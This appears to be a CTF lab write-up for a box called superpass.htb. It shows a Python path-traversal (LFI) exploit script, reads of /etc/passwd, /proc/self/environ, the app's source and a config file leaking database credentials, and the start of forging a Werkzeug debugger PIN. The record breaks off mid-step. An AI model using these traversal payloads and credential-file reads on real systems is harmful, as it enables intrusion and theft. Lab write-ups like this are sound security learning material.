
IP=`10.10.11.203`
## Enumeration
For the initial enumeration I used `nmap` and found port `22` and `80` open. I then opened this in the browser and added `superpass.htb` to `/etc/hosts` so that my browser knows which IP the domain points to. After a bit of exploring the site with burpsuite proxy listening to requests, I found an LFI in `/download?fn=../../../etc/passwd` and wrote a quick python script to easily run this exploit.

```python
#!/usr/bin/env python3

import sys
import requests

def send_request(file_path):
    url = f'http://superpass.htb/download?fn=../../../..{file_path}'
    headers = {
        'Host': 'superpass.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Cookie': 'session=.eJy9jsFqxDAMRH_F6ByK7VhylK_ovSyL5cibQNpd4uxp2X-voP_QuYiZ0cB7wbXtpa_aYf56gTvtwLf2Xm4KA3zuWrq6_X5z2487767UaqU71627h_18wOU9_PPuMhj0oX2F-Tyeam5bYAYplXRMNabUOHhBLFMQrtoUK1fxoY2cOE8oVuNE6lmzX1Axm0SQY1RpecxhIhIhZm8xR06SKCVC9BmJhaLPLXKRFHwgJfMNF8O_PrsefzQM718zF2nv.Ziaq2w.iKkM-0IZctn7LUE6U3_EP5d9xMc; remember_token=9|eeaac6a925a1b60cadef005d1dc2fea38856cec40c949ac6ce8402cf545461fbb6cb58b65c44e053b7f97224f59f4c67eff01f7f6edc3a7a103818358005962f',
        'Upgrade-Insecure-Requests': '1'
    }
    
    response = requests.get(url, headers=headers)
    print(f'Status Code: {response.status_code}')
    print('Response Headers:', response.headers)
    print('Response Body:', response.text)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 lfi.py </path/to/send/>")
        sys.exit(1)

    file_path = sys.argv[1]
    send_request(file_path)
```

- `/etc/passwd`
```bash
python lfi.py /../etc/passwd
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:41:18 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '1744', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

By running the following below, we can get the flask application debug printout, which will show us the paths. Thus easily allowing us to get the source code for the application:

```bash
python lfi.py /../          
Status Code: 500
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:42:26 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '13504', 'Connection': 'close'}
Response Body: <!doctype html>
<html lang=en>
  <head>
    <title>IsADirectoryError: [Errno 21] Is a directory: '/tmp/../../../../../'
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "E9bVv1uFtdrsXu2gc6pK";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>IsADirectoryError</h1>
<div class="detail">
  <p class="errormsg">IsADirectoryError: [Errno 21] Is a directory: &#39;/tmp/../../../../../&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-139923190719072">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">2528</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-139923062653888">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">2525</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: t.Optional[BaseException] = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-139923062654000">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1822</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: t.Union[ft.ResponseReturnValue, HTTPException],</pre></div>
</div>

<li><div class="frame" id="frame-139923062658480">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1820</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-139923062658592">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1796</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: t.Dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-139923062658816">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask_login/utils.py"</cite>,
      line <em class="line">290</em>,
      in <code class="function">decorated_view</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>return current_app.login_manager.unauthorized()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span># flask 1.x compatibility</pre>
<pre class="line before"><span class="ws">        </span># current_app.ensure_sync is only available in Flask &gt;= 2.0</pre>
<pre class="line before"><span class="ws">        </span>if callable(getattr(current_app, &#34;ensure_sync&#34;, None)):</pre>
<pre class="line current"><span class="ws">            </span>return current_app.ensure_sync(func)(*args, **kwargs)</pre>
<pre class="line after"><span class="ws">        </span>return func(*args, **kwargs)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>return decorated_view</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-139923062658704">
  <h4>File <cite class="filename">"/app/app/superpass/views/vault_views.py"</cite>,
      line <em class="line">102</em>,
      in <code class="function">download</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span>@blueprint.get(&#39;/download&#39;)</pre>
<pre class="line before"><span class="ws"></span>@login_required</pre>
<pre class="line before"><span class="ws"></span>def download():</pre>
<pre class="line before"><span class="ws">    </span>r = flask.request</pre>
<pre class="line before"><span class="ws">    </span>fn = r.args.get(&#39;fn&#39;)</pre>
<pre class="line current"><span class="ws">    </span>with open(f&#39;/tmp/{fn}&#39;, &#39;rb&#39;) as f:</pre>
<pre class="line after"><span class="ws">        </span>data = f.read()</pre>
<pre class="line after"><span class="ws">    </span>resp = flask.make_response(data)</pre>
<pre class="line after"><span class="ws">    </span>resp.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=superpass_export.csv&#39;</pre>
<pre class="line after"><span class="ws">    </span>resp.mimetype = &#39;text/csv&#39;</pre>
<pre class="line after"><span class="ws">    </span>return resp</pre></div>
</div>
</ul>
  <blockquote>IsADirectoryError: [Errno 21] Is a directory: &#39;/tmp/../../../../../&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2528, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2525, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1822, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1820, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1796, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File &#34;/app/venv/lib/python3.10/site-packages/flask_login/utils.py&#34;, line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File &#34;/app/app/superpass/views/vault_views.py&#34;, line 102, in download
    with open(f&#39;/tmp/{fn}&#39;, &#39;rb&#39;) as f:
IsADirectoryError: [Errno 21] Is a directory: &#39;/tmp/../../../../../&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2528, in wsgi_app
    response = self.handle_exception(e)
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2525, in wsgi_app
    response = self.full_dispatch_request()
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1822, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1820, in full_dispatch_request
    rv = self.dispatch_request()
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1796, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/app/venv/lib/python3.10/site-packages/flask_login/utils.py", line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File "/app/app/superpass/views/vault_views.py", line 102, in download
    with open(f'/tmp/{fn}', 'rb') as f:
IsADirectoryError: [Errno 21] Is a directory: '/tmp/../../../../../'


-->
```
**Paths found**
- `/app/app/superpass/views/vault_views.py`
- `/app/venv/lib/python3.10/site-packages/flask/app.py`
- `/app/venv/lib/python3.10/site-packages/flask_login/utils.py`
### Source Code for the Flask Application
- `app/app/superpass/infrastructure/view_modifiers.py`
```python
python lfi.py /../../../../app/app/superpass/infrastructure/view_modifiers.py
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:53:58 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '1331', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
from functools import wraps
import flask
from flask_login import current_user
import werkzeug
import werkzeug.wrappers


def response(*, mimetype: str = None, template_file: str = None):
    def response_inner(f):
        #print(f"Wrapping in response {f.__name__}", flush=True)

        @wraps(f)
        def view_method(*args, **kwargs):
            response_val = f(*args, **kwargs)

            if isinstance(response_val, werkzeug.wrappers.Response):
                return response_val

            if isinstance(response_val, flask.Response):
                return response_val

            if isinstance(response_val, dict):
                model = dict(response_val)
            else:
                model = dict()

            model['current_user'] = current_user

            if template_file and not isinstance(response_val, dict):
                raise Exception(
                    f"Invalid return type {type(response_val)}, we expected a dict as the return value.")

            if template_file:
                response_val = flask.render_template(template_file, **response_val)

            resp = flask.make_response(response_val)
            resp.model = model
            if mimetype:
                resp.mimetype = mimetype

            return resp

        return view_method

    return response_inner
```
- `app/app/superpass/views/vault_views.py`
```python
python lfi.py /../../../../app/app/superpass/views/vault_views.py 
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:44:39 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '2987', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
-----------------------------------------------------------------------------
Response Body: import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.post('/vault/add_row')
@login_required
def add_row_post():
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        return ''

    p = password_service.add_password(site, username, password, current_user.id)
    return flask.render_template('vault/partials/password_row.html', p=p)


@blueprint.post('/vault/update/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def update(id):
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        flask.abort(500)

    p = password_service.update_password(id, site, username, password, current_user.id)

    return {"p": p}


@blueprint.delete('/vault/delete/<id>')
@login_required
def delete(id):
    password_service.delete_password(id, current_user.id)
    return ''


@blueprint.get('/vault/export')
@login_required
def export():
    if current_user.has_passwords:        
        fn = password_service.generate_csv(current_user)
        return flask.redirect(f'/download?fn={fn}', 302)
    return "No passwords for user"
    

@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```
- `app/app/superpass/services/password_service.py`
```python
python lfi.py /../../../../app/app/superpass/services/password_service.py
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:48:08 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '2300', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
import csv
import datetime
import sqlalchemy as sa
import superpass.data.db_session as db_session
from superpass.data.password import Password
from superpass.data.user import User
from superpass.services.utility_service import get_random
from typing import Optional

def get_passwords_for_user(userid: int):

    session = db_session.create_session()
    user = session.query(User) \
        .options(sa.orm.joinedload(User.passwords))\
        .filter(User.id == userid) \
        .first()

    session.close()

    return user.passwords


def get_password_by_id(id: int, userid: int) -> Optional[Password]:

    session = db_session.create_session()
    password = session.query(Password)\
        .filter(
            Password.id == id,
            Password.user_id == userid
        ).first()

    session.close()

    return password


def add_password(site, username, password, userid):

    p = Password(url=site, username=username, password=password, user_id=userid)

    session = db_session.create_session()
    session.add(p)
    session.commit()
    session.close()

    return p


def delete_password(pid, userid: int):

    session = db_session.create_session()
    p = session.query(Password).filter(Password.id == pid, Password.user_id == userid).first()
    if p:
        session.delete(p)
        session.commit()
    session.close()


def update_password(pid, site, username, password, userid: int):

    session = db_session.create_session()
    p = session.query(Password).filter(Password.id == pid, Password.user_id == userid).first()
    if p:
        p.url = site
        p.username = username
        p.password = password
        p.last_updated = datetime.datetime.now()
        session.add(p)
        session.commit()
    session.close()

    return p


def generate_csv(user):

    rand = get_random(10)
    fn = f'{user.username}_export_{rand}.csv'
    path = f'/tmp/{fn}'

    header = ['Site', 'Username', 'Password']
    
    session = db_session.create_session()
    passwords = session.query(Password) \
        .filter(Password.user_id == user.id) \
        .all()
    session.close()

    with open(path, 'w') as f:
        writer = csv.writer(f)
        writer.writerow(header)
        writer.writerows((p.get_dict().values() for p in passwords))
 
    return fn
```
- `app/app/superpass/data/password.py`
```python
python lfi.py /../../../../app/app/superpass/data/password.py
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:49:02 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '847', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
import datetime
import sqlalchemy as sa
from  sqlalchemy import orm
from superpass.data.modelbase import SqlAlchemyBase

class Password(SqlAlchemyBase):
    __tablename__ = "passwords"

    id = sa.Column(sa.Integer, primary_key=True, autoincrement=True)
    created_date = sa.Column(sa.DateTime, default=datetime.datetime.now)
    last_updated_data = sa.Column(sa.DateTime, default=datetime.datetime.now)
    url = sa.Column(sa.String(256))
    username = sa.Column(sa.String(256))
    password = sa.Column(sa.String(256))
    
    user_id = sa.Column(sa.Integer, sa.ForeignKey("users.id"))
    user = orm.relation('User')

    def __repr__(self):
        return f'<Password {self.url}: {self.username} / {"*" * len(self.password)}>'


    def get_dict(self):
        return {"url": self.url, "username": self.username, "password": self.password}
```
- `app/app/superpass/data/modelbase.py`
```python
python lfi.py /../../../../app/app/superpass/data/modelbase.py
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:49:38 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '81', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
import sqlalchemy.ext.declarative as dec

SqlAlchemyBase = dec.declarative_base()
```

```python
python lfi.py /../../../../app/app/superpass/services/utility_service.py 
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:50:35 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '153', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
import datetime
import hashlib

def get_random(chars=20):
    return hashlib.md5(str(datetime.datetime.now()).encode() + b"SeCReT?!").hexdigest()[:chars]
```

```python
python lfi.py /../../../../app/app/superpass/data/user.py
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:51:17 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '793', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
from flask_login import UserMixin
import sqlalchemy as sa
from  sqlalchemy import orm
from typing import List
from superpass.services import password_service
from superpass.data.modelbase import SqlAlchemyBase
from superpass.data.password import Password


class User(UserMixin, SqlAlchemyBase):
    __tablename__ = 'users'

    id = sa.Column(sa.Integer, primary_key=True, autoincrement=True)
    username = sa.Column(sa.String(256), nullable=False)
    hashed_password = sa.Column(sa.String(256), nullable=False)
    
    passwords: List[Password] = orm.relation("Password", back_populates='user')
    

    def __repr__(self):
        return f'<User {self.username}>'

    
    @property
    def has_passwords(self):
        return len(password_service.get_passwords_for_user(self.id)) > 0
```

```python
python lfi.py /../../../../app/app/superpass/services/password_service.py
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 18:52:00 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '2300', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
-----------------------------------------------------------------------------
import csv
import datetime
import sqlalchemy as sa
import superpass.data.db_session as db_session
from superpass.data.password import Password
from superpass.data.user import User
from superpass.services.utility_service import get_random
from typing import Optional

def get_passwords_for_user(userid: int):

    session = db_session.create_session()
    user = session.query(User) \
        .options(sa.orm.joinedload(User.passwords))\
        .filter(User.id == userid) \
        .first()

    session.close()

    return user.passwords


def get_password_by_id(id: int, userid: int) -> Optional[Password]:

    session = db_session.create_session()
    password = session.query(Password)\
        .filter(
            Password.id == id,
            Password.user_id == userid
        ).first()

    session.close()

    return password


def add_password(site, username, password, userid):

    p = Password(url=site, username=username, password=password, user_id=userid)

    session = db_session.create_session()
    session.add(p)
    session.commit()
    session.close()

    return p


def delete_password(pid, userid: int):

    session = db_session.create_session()
    p = session.query(Password).filter(Password.id == pid, Password.user_id == userid).first()
    if p:
        session.delete(p)
        session.commit()
    session.close()


def update_password(pid, site, username, password, userid: int):

    session = db_session.create_session()
    p = session.query(Password).filter(Password.id == pid, Password.user_id == userid).first()
    if p:
        p.url = site
        p.username = username
        p.password = password
        p.last_updated = datetime.datetime.now()
        session.add(p)
        session.commit()
    session.close()

    return p


def generate_csv(user):

    rand = get_random(10)
    fn = f'{user.username}_export_{rand}.csv'
    path = f'/tmp/{fn}'

    header = ['Site', 'Username', 'Password']
    
    session = db_session.create_session()
    passwords = session.query(Password) \
        .filter(Password.user_id == user.id) \
        .all()
    session.close()

    with open(path, 'w') as f:
        writer = csv.writer(f)
        writer.writerow(header)
        writer.writerows((p.get_dict().values() for p in passwords))
 
    return fn
```

#### Foothold
Since we can read local files, we can try to generate the PIN by reading specific files which are used when generating the Wekzeug console PIN. We first must identify which user is this application is running as, which in this case is `www-data`. This was found from the file `/proc/self/environ`
```bash
python lfi.py /../../proc/self/environ
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 19:02:30 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '260', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body:
-----------------------------------------------------------------------------
LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=5ea0444daa9246279caa67c4e625e3feJOURNAL_STREAM=8:32347SYSTEMD_EXEC_PID=1074CONFIG_PATH=/app/config_prod.json
```
**CONFIG_PATH=/app/config_prod.json**
```bash
python lfi.py /../../../../app/config_prod.json
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 19:03:38 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '88', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```
- Nice, we can check this database once we have a foothold on the host.

Next, we need the mac address from `/sys/class/net/eth0/address`
```bash
python lfi.py /../../../../sys/class/net/eth0/address
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 19:07:05 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '18', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
00:50:56:b9:f1:5d
```
**`00:50:56:b9:f1:5d`**
```python
cat getPin.py 
#!/usr/bin/python3
import binascii

mac_address = "00:50:56:b9:f1:5d"
mac_addr_int = int(mac_address.replace(":", ""), 16)
print(f"MAC: {mac_address}\n\nMAC(int): {mac_addr_int}")
```
- Output
```bash
python getPin.py                                     
MAC: 00:50:56:b9:f1:5d

MAC(int): 345052410205
```

Next, reading `/etc/machine-id`
```bash
python lfi.py /../../../../etc/machine-id
Status Code: 200
